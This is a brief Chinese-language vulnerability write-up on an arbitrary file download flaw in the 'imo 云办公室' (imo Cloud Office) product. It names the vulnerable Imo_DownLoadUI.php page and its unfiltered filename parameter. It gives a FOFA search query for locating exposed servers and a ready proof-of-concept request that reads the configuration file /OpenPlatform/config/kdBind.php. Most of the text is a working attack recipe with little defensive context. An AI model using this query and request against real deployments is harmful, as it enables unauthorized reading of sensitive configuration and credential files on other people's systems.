# imo 云办公室 Imo_DownLoadUI.php 任意文件下载漏洞

## 漏洞描述

imo 云办公室 由于 /file/Placard/upload/Imo_DownLoadUI.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件。

## 漏洞影响

```
imo 云办公室
```

## FOFA

```
app="iMO-云办公室"
```

## 漏洞复现

登录页面

![image-20220524171455819](./images/202205241714963.png)

验证POC

```
/file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php
```

![image-20220524171627797](./images/202205241716860.png)